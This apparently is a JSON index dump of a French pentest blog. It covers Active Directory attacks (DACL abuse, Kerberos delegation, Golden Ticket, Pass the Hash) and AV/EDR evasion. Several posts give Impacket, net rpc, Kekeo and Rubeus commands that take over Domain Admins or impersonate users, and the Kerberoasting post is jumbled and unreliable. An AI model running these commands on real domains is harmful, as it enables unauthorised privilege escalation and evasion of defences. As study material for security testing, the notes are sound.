PwnedGPO\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"4force-gpo-update\"\u003e4.Force GPO Update\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egpupdate /force\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"5spawn-administrative-shell\"\u003e5.Spawn Administrative Shell\u003c/h3\u003e\n\u003cp\u003eRunasCs.exe pour lancer un shell cmd.exe avec les identifiants\u003c/p\u003e","title":""},{"content":" exploitation des vulnérabilités du contrôle d\u0026rsquo;accès Windows/Active Directory pour l\u0026rsquo;élévation des privilèges, la persistance et les mouvements latéraux. Couvre les techniques offensives d\u0026rsquo;abus des ACL, l\u0026rsquo;analyse BloodHound et les méthodes de renforcement défensif pour les équipes de sécurité des entreprises. Une liste de contrôle d\u0026rsquo;accès (ACL) est une liste d\u0026rsquo; entrées de contrôle d\u0026rsquo;accès (ACE). Chaque ACE d\u0026rsquo;une ACL identifie un administrateur et spécifie les droits d\u0026rsquo;accès autorisés, refusés ou audités pour cet administrateur. Le descripteur de sécurité d\u0026rsquo;un objet sécurisable peut contenir deux types d\u0026rsquo;ACL : une DACL et une SACL . Une liste de contrôle d\u0026rsquo;accès discrétionnaire (DACL) identifie les personnes autorisées ou non à accéder à un objet sécurisable. Lorsqu\u0026rsquo;un processus tente d\u0026rsquo;accéder à un objet sécurisable, le système vérifie les ACE de la DACL de l\u0026rsquo;objet afin de déterminer s\u0026rsquo;il doit y accéder. DAC La méthode traditionnelle de mise en œuvre du contrôle d\u0026rsquo;accès contrôle l\u0026rsquo;accès en fonction de l\u0026rsquo;identité du demandeur et des règles d\u0026rsquo;accès qui précisent ce que les demandeurs sont autorisés à faire (ou non). Ce contrôle d\u0026rsquo;accès est discrétionnaire , car une entité peut disposer de droits d\u0026rsquo;accès lui permettant, de son propre chef, d\u0026rsquo;autoriser une autre entité à accéder à une ressource ; contrairement à MAC , où l\u0026rsquo;entité ayant accès à une ressource ne peut pas, de son propre chef, autoriser une autre entité à y accéder. Windows est un exemple de système d\u0026rsquo;exploitation DAC , qui utilise des listes de contrôle d\u0026rsquo;accès discrétionnaires ( DACL ).\nAbus d\u0026rsquo;AD-DACL : WriteOwner une technique puissante permettant aux attaquants de modifier la propriété des objets de l\u0026rsquo;annuaire. Plus précisément, en abusant de l\u0026rsquo;autorisation WriteOwner dans les listes de contrôle d\u0026rsquo;accès discrétionnaires (DACL) , les adversaires peuvent prendre le contrôle d\u0026rsquo;objets sensibles et élever leurs privilèges au sein du domaine.\n1 . [[impacket]] Outil Linux Impacket – Octroi de la propriété et du contrôle total À partir de systèmes de type UNIX, cela peut être fait avec owneredit.py\nimpacket-owneredit -action write -new-owner \u0026#39;\u0026lt;username\u0026gt;\u0026#39; -target-dn \u0026#39;CN=Management,CN=Users,DC=domaine,DC=local\u0026#39; \u0026#39;\u0026lt;domain name\u0026gt;\u0026#39;/\u0026#39;\u0026lt;username\u0026gt;\u0026#39;:\u0026#39;\u0026lt;password\u0026gt;\u0026#39; Avec l\u0026rsquo;aide de owneredit, le DACL de cet objet est modifié avec succès, Accordons à un utilisateur un contrôle total sur le groupe Administrateurs du domaine à l\u0026rsquo;aide de l\u0026rsquo;outil dacledit d\u0026rsquo;Impacket.\nimpacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;\u0026lt;username\u0026gt;\u0026#39; -target-dn \u0026#39;CN=Admins du domaine,CN=Utilisateurs,DC=domaine,DC=local\u0026#39; \u0026#39;\u0026lt;domain name\u0026gt;\u0026#39; / \u0026#39;\u0026lt;username\u0026gt;\u0026#39; : \u0026#39;password\u0026#39; -dc-ip \u0026lt;Domain_ip\u0026gt; python3 /opt/impacket-with-dacledit/examples/dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -inheritance -principal \u0026#39;judith.mader\u0026#39; -target \u0026#39;management\u0026#39; \u0026#34;certified.htb\u0026#34;/\u0026#34;judith.mader\u0026#34;:\u0026#39;judith09\u0026#39; Avec l\u0026rsquo;aide de dacledit, le DACL de cet objet est modifié avec succès, l\u0026rsquo; utilisateur a désormais un contrôle total sur le groupe\nAjout d\u0026rsquo;un membre au groupe Le testeur peut abuser de cette autorisation en ajoutant l\u0026rsquo;utilisateur au groupe Administrateur de domaine et en répertoriant les membres administrateurs de domaine pour garantir que les utilisateurs deviennent administrateurs de domaine.\nnet rpc group addmem \u0026#34;Domain Admins\u0026#34; \u0026lt;username\u0026gt; -U ignite.local/aaru%\u0026#39;Password@1\u0026#39; -S Domain_ip Abus d\u0026rsquo;AD-DACL : AddSelf Abus d\u0026rsquo;AD-DACL : WriteDacl Utilisation abusive d\u0026rsquo;AD-DACL : GenericWrite Abuser d\u0026rsquo;AD-DACL : ForceChangePassword Abuser d\u0026rsquo;AD-DACL : AllExtendedRights https://www.hackingarticles.in/category/dacl-attacks/\n","permalink":"https://nyobemichel.me/posts/activedirectory/abusing-active-directory-acls/","summary":"\u003cp\u003e exploitation des vulnérabilités du contrôle d\u0026rsquo;accès Windows/Active Directory pour l\u0026rsquo;élévation des privilèges, la persistance et les mouvements latéraux. Couvre les techniques offensives d\u0026rsquo;abus des ACL, l\u0026rsquo;analyse BloodHound et les méthodes de renforcement défensif pour les équipes de sécurité des entreprises.\n Une liste de contrôle d\u0026rsquo;accès (ACL) est une liste d\u0026rsquo; entrées de contrôle d\u0026rsquo;accès (ACE). Chaque ACE d\u0026rsquo;une ACL identifie un administrateur et spécifie les droits d\u0026rsquo;accès autorisés, refusés ou audités pour cet administrateur. Le descripteur de sécurité d\u0026rsquo;un objet sécurisable peut contenir deux types d\u0026rsquo;ACL : une DACL et une SACL .\n Une liste de contrôle d\u0026rsquo;accès discrétionnaire (DACL) identifie les personnes autorisées ou non à accéder à un objet sécurisable. Lorsqu\u0026rsquo;un processus tente d\u0026rsquo;accéder à un objet sécurisable, le système vérifie les ACE de la DACL de l\u0026rsquo;objet afin de déterminer s\u0026rsquo;il doit y accéder.\n \u003ccode\u003eDAC\u003c/code\u003e La méthode traditionnelle de mise en œuvre du contrôle d\u0026rsquo;accès contrôle l\u0026rsquo;accès en fonction de l\u0026rsquo;identité du demandeur et des règles d\u0026rsquo;accès qui précisent ce que les demandeurs sont autorisés à faire (ou non). Ce contrôle d\u0026rsquo;accès est discrétionnaire , car une entité peut disposer de droits d\u0026rsquo;accès lui permettant, de son propre chef, d\u0026rsquo;autoriser une autre entité à accéder à une ressource ; contrairement à MAC , où l\u0026rsquo;entité ayant accès à une ressource ne peut pas, de son propre chef, autoriser une autre entité à y accéder. Windows est un exemple de système d\u0026rsquo;exploitation DAC , qui utilise des listes de contrôle d\u0026rsquo;accès discrétionnaires ( DACL ).\u003c/p\u003e","title":""},{"content":"AD CS est un rôle serveur qui fonctionne comme l\u0026rsquo;implémentation de l\u0026rsquo;infrastructure à clés publiques PKI de Microsoft. Comme prévu, il s\u0026rsquo;intègre étroitement à Active Directory et permet l\u0026rsquo;émission de certificats, qui sont des documents électroniques signés numériquement au format X.509, utilisables pour le chiffrement, la signature de messages et/ou l\u0026rsquo;authentification (notre axe de recherche).\nhttps://github.com/GhostPack/PSPKIAudit https://posts.specterops.io/certified-pre-owned-d95910965cd2\n","permalink":"https://nyobemichel.me/posts/activedirectory/adcs-attack/","summary":"\u003cp\u003eAD CS est un rôle serveur qui fonctionne comme l\u0026rsquo;implémentation de l\u0026rsquo;infrastructure à clés publiques PKI de Microsoft.\nComme prévu, il s\u0026rsquo;intègre étroitement à Active Directory et permet l\u0026rsquo;émission de certificats, qui sont des documents électroniques signés numériquement au format X.509, utilisables pour le chiffrement, la signature de messages et/ou l\u0026rsquo;authentification (notre axe de recherche).\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/GhostPack/PSPKIAudit\"\u003ehttps://github.com/GhostPack/PSPKIAudit\u003c/a\u003e\n\u003ca href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\"\u003ehttps://posts.specterops.io/certified-pre-owned-d95910965cd2\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/bypassing-wdeck/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/cross-forest-attack/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/database-link-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/dcsync-attaque/","summary":"","title":""},{"content":"Qu’est-ce que la délégation Kerberos ? La délégation Kerberos est un paramètre de délégation qui permet aux applications de demander des informations d’identification d’accès à l’utilisateur final pour accéder aux ressources pour le compte de l’utilisateur d’origine.\nLes trois principaux types de délégation que je vais couvrir sont les suivants:\nDélégation sans contrainte : tout service peut être utilisé de manière abusive si l’une de ses entrées de délégation est sensible. Délégation contrainte : les entités contraintes peuvent être abusées si l’une de leurs entrées de délégation est sensible. Délégation contrainte basée sur les ressources (RBCD) : les entités contraintes basées sur les ressources peuvent être abusées si l’entité elle-même est sensible. Délégation contrainte La délégation contrainte permet aux administrateurs de configurer les services auxquels un compte utilisateur ou ordinateur peut déléguer et quels protocoles d\u0026rsquo;authentification peuvent être utilisés\nExploitation Technique 1 Pour exploiter la délégation contrainte, nous avons besoin de trois choses essentielles :\nUn compte compromis configuré avec une délégation contrainte Un compte privilégié cible pour se faire usurper en demandant l\u0026rsquo;accès au service Informations sur la machine hébergeant le service auquel nous aurons accès Tout d\u0026rsquo;abord, nous allons voirsi la délégation contrainte du compte «Admnistrateur» est configurée pour:\nGet-ADUser Administrateur -Properties msDs-AllowedToDelegateTo | select -ExpandProperty msDs-AllowedToDelegateTo en utilisant Kekeo nous demandons le compte TGT pour le compte\nkeko # tgt : : ask /user:NameUser /domain:NameDomain /rc4 Maintenant que nous avons le TGT, nous exécutons la demande TGS pour le compte que nous voulons imiter pour le service cible que le compte\nkeko # tgs : : s4u /tgt:namedufichier.kirbi /user:nom /service:nameservice En revenant à Mimikatz, nous pouvons utiliser Pass the Ticket pour accéder au service\nmimikatz # privilege: : debug Technique 2 Avec Powerview\nGet-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth Rubeus.exe s4u /user:appsvc /aes256:aaaaaaaaa /impersonateuser:administrator /msdsspn:servicename /domain:namedomain /ptt https://adsecurity.org/?p=1667\n","permalink":"https://nyobemichel.me/posts/activedirectory/delegation-kerberos/","summary":"\u003ch2 id=\"quest-ce-que-la-délégation-kerberos-\"\u003eQu’est-ce que la délégation Kerberos ?\u003c/h2\u003e\n\u003cp\u003eLa délégation Kerberos est un paramètre de délégation qui permet aux applications de demander des informations d’identification d’accès à l’utilisateur final pour accéder aux ressources pour le compte de l’utilisateur d’origine.\u003c/p\u003e\n\u003cp\u003eLes trois principaux types de délégation que je vais couvrir sont les suivants:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eDélégation sans contrainte\u003c/strong\u003e : tout service peut être utilisé de manière abusive si l’une de ses entrées de délégation est sensible.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDélégation contrainte\u003c/strong\u003e : les entités contraintes peuvent être abusées si l’une de leurs entrées de délégation est sensible.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDélégation contrainte basée sur les ressources (RBCD)\u003c/strong\u003e : les entités contraintes basées sur les ressources peuvent être abusées si l’entité elle-même est sensible.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"délégation-contrainte\"\u003eDélégation contrainte\u003c/h2\u003e\n\u003cp\u003eLa délégation contrainte permet aux administrateurs de configurer les services auxquels un compte utilisateur ou ordinateur peut déléguer et quels protocoles d\u0026rsquo;authentification peuvent être utilisés\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/dpapi-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/dumping-the-certificate-pfx/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/forest-trust-key-sid-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/gmsa-abuse/","summary":"","title":""},{"content":"L\u0026rsquo;attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT en utilisant le hachage du mot de passe du compte krbtgt. Lorsque ces tickets sont présentés à un serveur AD, les informations qu\u0026rsquo;ils contiennent ne seront pas du tout vérifiées et seront considérées comme valides car elles sont signées avec le hachage du mot de passe du compte krbtgt. L\u0026rsquo; attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT (Ticket Granting Tickets) en utilisant le hachage du mot de passe du compte krbtgt . Lorsque ces tickets sont présentés à un serveur AD, les informations qu\u0026rsquo;ils contiennent ne sont pas du tout vérifiées et sont considérées comme valides en raison de la signature avec le hachage du mot de passe du compte krbtgt . Par exemple, il est possible de signer un ticket pour un utilisateur qui n\u0026rsquo;existe pas, comme DoesNotExist s\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;un , le billet dit aussi administrateur de domaine, et de demander un ticket TGS (Ticket Granting Service) qui lui permet d\u0026rsquo;accéder à des machines distantes. Pour des raisons de discrétion, il est presque toujours préférable d\u0026rsquo;utiliser des utilisateurs qui existent dans le domaine. Cependant, mettre de fausses informations dans le ticket peut être un excellent moyen de montrer l\u0026rsquo;impact et le manque de surveillance d\u0026rsquo;une organisation sur ces événements.\n","permalink":"https://nyobemichel.me/posts/activedirectory/golden-ticket/","summary":"\u003cp\u003eL\u0026rsquo;attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT en utilisant le hachage du mot de passe du compte krbtgt. Lorsque ces tickets sont présentés à un serveur AD, les informations qu\u0026rsquo;ils contiennent ne seront pas du tout vérifiées et seront considérées comme valides car elles sont signées avec le hachage du mot de passe du compte krbtgt.\nL\u0026rsquo; attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT (Ticket Granting Tickets) en utilisant le hachage du mot de passe du compte krbtgt . Lorsque ces tickets sont présentés à un\nserveur AD, les informations qu\u0026rsquo;ils contiennent ne sont pas du tout vérifiées et sont considérées comme valides\nen raison de la signature avec le hachage du mot de passe du compte krbtgt . Par exemple, il est possible de signer\nun ticket pour un utilisateur qui n\u0026rsquo;existe pas, comme DoesNotExist s\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;un\n, le billet dit aussi\nadministrateur de domaine, et de demander un ticket TGS (Ticket Granting Service) qui lui permet d\u0026rsquo;accéder à des\nmachines distantes. Pour des raisons de discrétion, il est presque toujours préférable d\u0026rsquo;utiliser des utilisateurs qui\nexistent dans le domaine. Cependant, mettre de fausses informations dans le ticket peut être un excellent moyen de\nmontrer l\u0026rsquo;impact et le manque de surveillance d\u0026rsquo;une organisation sur ces événements.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/kerberoast---cross-domain-attack/","summary":"","title":""},{"content":"Cet abus peut survenir lors du contrôle d\u0026rsquo;un objet doté d\u0026rsquo;un GenericAll, `GenericWrdddtechnique est appelée Kerberoasting ciblé.Cet abus peut survenir lors du contrôle d\u0026rsquo;un objet doté d\u0026rsquo;un GenericAll, GenericWriteou sur la cible. Un membre du groupe Opérateur de compteWriteProperty dispose généralement de ces autorisations.Validated-SPN[]\nL\u0026rsquo;attaquant peut ajouter un SPN ( ServicePrincipalName) à ce compte. Une fois ce SPN obtenu, le compte devient vulnérable au Kerberoasting . Cette technique est appelée Kerberoasting ciblé.Cet abus peut survenir lors du contrôle d\u0026rsquo;un objet doté d\u0026rsquo;un GenericAll, GenericWriteou sur la cible. Un membre du groupe Opérateur de compteWriteProperty dispose généralement de ces autorisations.Validated-SPN\nL\u0026rsquo;attaquant peut ajouter un SPN ( ServicePrincipalName) à ce compte. Une fois ce SPN obtenu, le compte devient vulnérable au Kerberoasting . Cette technique est appelée Kerberoasting ciblé.\n","permalink":"https://nyobemichel.me/posts/activedirectory/kerberoasting-cibl%C3%A9/","summary":"\u003cp\u003eCet abus peut survenir lors du contrôle d\u0026rsquo;un objet doté d\u0026rsquo;un \u003ccode\u003eGenericAll\u003c/code\u003e, `GenericWrdddtechnique est appelée Kerberoasting ciblé.Cet abus peut survenir lors du contrôle d\u0026rsquo;un objet doté d\u0026rsquo;un GenericAll, GenericWriteou sur la cible. Un membre du groupe Opérateur de compteWriteProperty dispose généralement de ces autorisations.Validated-SPN[]\u003c/p\u003e\n\u003cp\u003eL\u0026rsquo;attaquant peut ajouter un SPN ( \u003ccode\u003eServicePrincipalName\u003c/code\u003e) à ce compte. Une fois ce SPN obtenu, le compte devient vulnérable au \u003ca href=\"https://www.thehacker.recipes/ad/movement/kerberos/kerberoast\"\u003eKerberoasting\u003c/a\u003e . Cette technique est appelée Kerberoasting ciblé.Cet abus peut survenir lors du contrôle d\u0026rsquo;un objet doté d\u0026rsquo;un \u003ccode\u003eGenericAll\u003c/code\u003e, \u003ccode\u003eGenericWrite\u003c/code\u003eou sur la cible. Un membre du groupe \u003ca href=\"https://www.thehacker.recipes/ad/movement/builtins/security-groups\"\u003eOpérateur de compte\u003c/a\u003e\u003ccode\u003eWriteProperty\u003c/code\u003e dispose généralement de ces autorisations.\u003ccode\u003eValidated-SPN\u003c/code\u003e\u003ca href=\"https://www.thehacker.recipes/ad/movement/builtins/security-groups\"\u003e\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/laps-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/pam-trust---shadow-principal/","summary":"","title":""},{"content":"Qu\u0026rsquo;est-ce qu\u0026rsquo;une attaque Pass the Hash ? L\u0026rsquo;attaque « Pass the Hash » est répandue dans les environnements Windows. Elle exploite le mécanisme d\u0026rsquo;authentification du système d\u0026rsquo;exploitation Windows.\nPour éviter de stocker les mots de passe en clair, Windows conserve les hachages NTLM des mots de passe des utilisateurs. Lors du processus d\u0026rsquo;authentification, Windows compare ces hachages plutôt que les mots de passe en clair. L\u0026rsquo;attaque « Pass the Hash » exploite ce mécanisme.\nAu lieu de voler et d\u0026rsquo;utiliser des mots de passe en clair, les pirates se concentrent sur l\u0026rsquo;obtention et l\u0026rsquo;utilisation des hachages pour s\u0026rsquo;authentifier sur diverses ressources réseau. L\u0026rsquo;attaque « Pass the Hash » est furtive et très efficace.\nLors d\u0026rsquo;une attaque par « pass the Hash », un attaquant commence par accéder au hachage d\u0026rsquo;un utilisateur, souvent en vidant le contenu de la base de données SAM du système ou de la mémoire, à l\u0026rsquo;aide d\u0026rsquo;outils comme Mimikatz.\n","permalink":"https://nyobemichel.me/posts/activedirectory/pass-the-hash/","summary":"\u003ch2 id=\"quest-ce-quune-attaque-pass-the-hash-\"\u003eQu\u0026rsquo;est-ce qu\u0026rsquo;une attaque Pass the Hash ?\u003c/h2\u003e\n\u003cp\u003eL\u0026rsquo;attaque « Pass the Hash » est répandue dans les environnements Windows. Elle exploite le mécanisme d\u0026rsquo;authentification du système d\u0026rsquo;exploitation Windows.\u003c/p\u003e\n\u003cp\u003ePour éviter de stocker les mots de passe en clair, Windows conserve les hachages NTLM des mots de passe des utilisateurs. Lors du processus d\u0026rsquo;authentification, Windows compare ces hachages plutôt que les mots de passe en clair. L\u0026rsquo;attaque « Pass the Hash » exploite ce mécanisme.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/passe-ticket/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/resource-based-constrained-delegation/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/sans-titre/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/ticket-silver/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/unconstrained-delegation/","summary":"","title":""},{"content":"Types de techniques de détection Détection dynamique La détection dynamique est une approche plus avancée et plus complexe que la détection statique. Elle se concentre davantage sur la vérification des fichiers à l\u0026rsquo;exécution, à l\u0026rsquo;aide de différentes méthodes. La première méthode consiste à surveiller les API Windows. Une autre méthode de détection dynamique est le sandboxing.\nDétection heuristique et comportementale La détection heuristique et comportementale est devenue essentielle dans les antivirus modernes . Les logiciels antivirus modernes s\u0026rsquo;appuient sur ce type de détection pour détecter les logiciels malveillants.\n","permalink":"https://nyobemichel.me/posts/avedrevasion/introduction-antivirus/","summary":"\u003ch1 id=\"types-de-techniques-de-détection\"\u003eTypes de techniques de détection\u003c/h1\u003e\n\u003ch2 id=\"détection-dynamique\"\u003eDétection dynamique\u003c/h2\u003e\n\u003cp\u003eLa détection dynamique est une approche plus avancée et plus complexe que la détection statique. Elle se concentre davantage sur la vérification des fichiers à l\u0026rsquo;exécution, à l\u0026rsquo;aide de différentes méthodes.\nLa première méthode consiste à surveiller les API Windows.\nUne autre méthode de détection dynamique est le sandboxing.\u003c/p\u003e\n\u003ch2 id=\"détection-heuristique-et-comportementale\"\u003eDétection heuristique et comportementale\u003c/h2\u003e\n\u003cp\u003eLa détection heuristique et comportementale est devenue essentielle dans les antivirus modernes . Les logiciels antivirus modernes s\u0026rsquo;appuient sur ce type de détection pour détecter les logiciels malveillants.\u003c/p\u003e","title":""},{"content":"L\u0026rsquo;obfuscation est largement utilisée dans de nombreux domaines liés aux logiciels pour protéger la propriété intellectuelle ( PI ) et d\u0026rsquo;autres informations propriétaires qu\u0026rsquo;une application peut contenir.\n","permalink":"https://nyobemichel.me/posts/avedrevasion/obfuscation-principe/","summary":"\u003cp\u003eL\u0026rsquo;obfuscation est largement utilisée dans de nombreux domaines liés aux logiciels pour protéger \u003cstrong\u003ela\u003c/strong\u003e \u003cstrong\u003epropriété\u003c/strong\u003e intellectuelle ( \u003cstrong\u003ePI\u003c/strong\u003e ) et d\u0026rsquo;autres informations propriétaires qu\u0026rsquo;une application peut contenir.\u003c/p\u003e","title":""},{"content":"Architecture AV/EDR Détection basée sur la signature La détection basée sur les signatures s’appuie sur des modèles connus de code malveillant (chaînes binaires, hachages ou séquences d’instructions spécifiques) pour identifier les menaces.\nTechniques d\u0026rsquo;évasion :\nRéencodage ou cryptage du shellcode. Enveloppement de stub pour générer de nouveaux hachages. Utilisation de packers ou de crypteurs. Détection heuristique La détection heuristique implique des vérifications statiques et dynamiques basées sur des règles sur le code, à la recherche d\u0026rsquo;attributs ou de comportements suspects. Comment ça marche :\nUtilise des règles prédéfinies ou des vérifications de modèles de type YARA. Recherche des constructions suspectes : Utilisation de l\u0026rsquo;API (par exemple, VirtualAllocEx, WriteProcessMemory). Noms de section ou autorisations anormaux ( .textmarqués comme RWX). Entropie élevée suggérant un cryptage ou un emballage. Exemples :\nFichier PE avec une petite .textsection et une grande .datasection. Utilisation de IsDebuggerPresent()l\u0026rsquo;API. En-têtes de fichiers non standard ou métadonnées PE modifiées. Techniques d\u0026rsquo;évasion :\nRembourrage des charges utiles pour réduire l\u0026rsquo;entropie. Obfuscation des appels d\u0026rsquo;API ou retard de chargement. Diviser la logique malveillante en plusieurs étapes. Détection comportementale La détection comportementale surveille le comportement d’exécution des processus et le corrèle avec des modèles malveillants connus.\nDétection basée sur l\u0026rsquo;apprentissage automatique (ML) La détection ML implique la formation de modèles sur de grands ensembles de données de comportements bénins et malveillants pour identifier des anomalies ou des modèles de type malware.\nComposant principal d\u0026rsquo;un EDR Capteur Le capteur est le composant logiciel léger installé sur le point de terminaison qui collecte la télémétrie et surveille le comportement en temps réel.\nKernel Driver Le pilote fonctionne dans l\u0026rsquo;anneau 0 , offrant une intégration profonde avec le noyau du système d\u0026rsquo;exploitation pour surveiller les opérations de bas niveau.\nUserland Components Ces composants fonctionnent en mode utilisateur et s\u0026rsquo;interfacent directement avec les API et les applications du système d\u0026rsquo;exploitation.\nBackend (On-Premise or Hybrid) Le backend est l’infrastructure qui reçoit et traite la télémétrie de tous les points de terminaison de l’environnement.\nCloud Component Les solutions EDR modernes utilisent une infrastructure cloud pour centraliser l\u0026rsquo;intelligence, l\u0026rsquo;analyse et les mises à jour. Pour contourner la surveillance des appels API/système :\nStratégies d\u0026rsquo;évasion du Userland : Mappage manuel : chargez les DLL manuellement pour éviter LoadLibrary()la journalisation IAT. Appels système directs : utilisez des outils tels que SysWhispersou Hell’s Gatepour appeler directement les appels système. Appels système indirects : utilisez des gadgets ou des fonctions stub pour masquer la pile d\u0026rsquo;appels. Évasion au niveau du noyau (avancé) : Syscall Stomping : écrasez les instructions d\u0026rsquo;appel système pour rediriger vers des appels système alternatifs. Contournement ETW : corrigez ou désactivez les consommateurs ETW comme EtwEventWrite. Suppression des rappels : désenregistrez les rappels du noyau (nécessite un pilote en mode noyau). Hooking Le hooking consiste à intercepter ou à rediriger des appels de fonction ou des événements système. Il existe deux principaux niveaux de hooking selon son implémentation : le mode utilisateur (Userland) et le mode noyau (Kernelland) .\nPrésentation de l\u0026rsquo;architecture d\u0026rsquo;exécution de Windows Avant de plonger dans le hooking, il est essentiel de comprendre que Windows possède une architecture en couches :\nMode utilisateur : où s\u0026rsquo;exécutent les applications standard. Accès limité aux ressources système. Mode noyau : le cœur du système d\u0026rsquo;exploitation (le noyau Windows) et les pilotes de périphériques. Son accès est illimité. ","permalink":"https://nyobemichel.me/posts/avedrevasion/techniques-pratiques-d%C3%A9vasion-av-edr/","summary":"\u003ch1 id=\"architecture-avedr\"\u003eArchitecture AV/EDR\u003c/h1\u003e\n\u003ch3 id=\"détection-basée-sur-la-signature\"\u003e\u003cstrong\u003eDétection basée sur la signature\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eLa détection basée sur les signatures s’appuie sur des modèles connus de code malveillant (chaînes binaires, hachages ou séquences d’instructions spécifiques) pour identifier les menaces.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTechniques d\u0026rsquo;évasion :\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRéencodage ou cryptage du shellcode.\u003c/li\u003e\n\u003cli\u003eEnveloppement de stub pour générer de nouveaux hachages.\u003c/li\u003e\n\u003cli\u003eUtilisation de packers ou de crypteurs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"détection-heuristique\"\u003e\u003cstrong\u003eDétection heuristique\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eLa détection heuristique implique des vérifications statiques et dynamiques basées sur des règles sur le code, à la recherche d\u0026rsquo;attributs ou de comportements suspects.\n\u003cstrong\u003eComment ça marche :\u003c/strong\u003e\u003c/p\u003e","title":""},{"content":"Les services de fédération Active Directory (AD FS) permettent la gestion des identités et des accès fédérés en partageant les identités numériques et les droits au-delà des limites de sécurité et d’entreprise. AD FS étend la possibilité d’utiliser la fonctionnalité d’authentification unique disponible dans une seule limite de sécurité ou d’entreprise aux applications accessibles sur Internet pour permettre aux clients, partenaires et fournisseurs une expérience utilisateur simplifiée tout en accédant aux applications web d’une organisation.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-fs/overview/ad-fs-openid-connect-oauth-flows-scenarios\n","permalink":"https://nyobemichel.me/posts/azure/active-directory-federation-services-ad-fs/","summary":"\u003cp\u003eLes services de fédération Active Directory (AD FS) permettent la gestion des identités et des accès fédérés en partageant les identités numériques et les droits au-delà des limites de sécurité et d’entreprise. AD FS étend la possibilité d’utiliser la fonctionnalité d’authentification unique disponible dans une seule limite de sécurité ou d’entreprise aux applications accessibles sur Internet pour permettre aux clients, partenaires et fournisseurs une expérience utilisateur simplifiée tout en accédant aux applications web d’une organisation.\u003c/p\u003e","title":""},{"content":"Chaque organisation a des besoins différents en matière d\u0026rsquo;authentification. Microsoft Azure et Azure Government proposent les quatre options d\u0026rsquo;authentification sans mot de passe suivantes, compatibles avec Microsoft Entra ID :\nWindows Hello Entreprise Microsoft Authenticator Clés d\u0026rsquo;accès FIDO2 (Fast IDentity Online 2) Authentification basée sur un certificat Windows Hello Entreprise Windows Hello Entreprise est idéal pour les professionnels de l\u0026rsquo;information disposant de leur propre PC Windows. Les identifiants biométriques et le code PIN sont directement liés au PC de l\u0026rsquo;utilisateur, empêchant ainsi tout accès autre que celui du propriétaire. Grâce à l\u0026rsquo;intégration de l\u0026rsquo;infrastructure à clés publiques (PKI) et à la prise en charge intégrée de l\u0026rsquo;authentification unique (SSO), Windows Hello Entreprise offre un moyen pratique d\u0026rsquo;accéder facilement aux ressources de l\u0026rsquo;entreprise, sur site et dans le cloud.\nMicrosoft Authenticator Vous pouvez également autoriser le téléphone de votre employé à utiliser une méthode d\u0026rsquo;authentification sans mot de passe. Vous utilisez peut-être déjà l\u0026rsquo;application Authenticator comme option d\u0026rsquo;authentification multifacteur pratique, en complément d\u0026rsquo;un mot de passe. Vous pouvez également utiliser l\u0026rsquo;application Authenticator comme option sans mot de passe.\nClés d\u0026rsquo;accès (FIDO2) L\u0026rsquo;Alliance FIDO (Fast IDentity Online) contribue à promouvoir des normes d\u0026rsquo;authentification ouvertes et à réduire l\u0026rsquo;utilisation des mots de passe comme moyen d\u0026rsquo;authentification. FIDO2 est la dernière norme intégrant la norme d\u0026rsquo;authentification Web (WebAuthn).\nAuthentification basée sur un certificat ","permalink":"https://nyobemichel.me/posts/azure/authentification-sans-mot-de-passe-pour-microsoft-entra-id/","summary":"\u003cp\u003eChaque organisation a des besoins différents en matière d\u0026rsquo;authentification. Microsoft Azure et Azure Government proposent les quatre options d\u0026rsquo;authentification sans mot de passe suivantes, compatibles avec Microsoft Entra ID :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWindows Hello Entreprise\u003c/li\u003e\n\u003cli\u003eMicrosoft Authenticator\u003c/li\u003e\n\u003cli\u003eClés d\u0026rsquo;accès FIDO2 (Fast IDentity Online 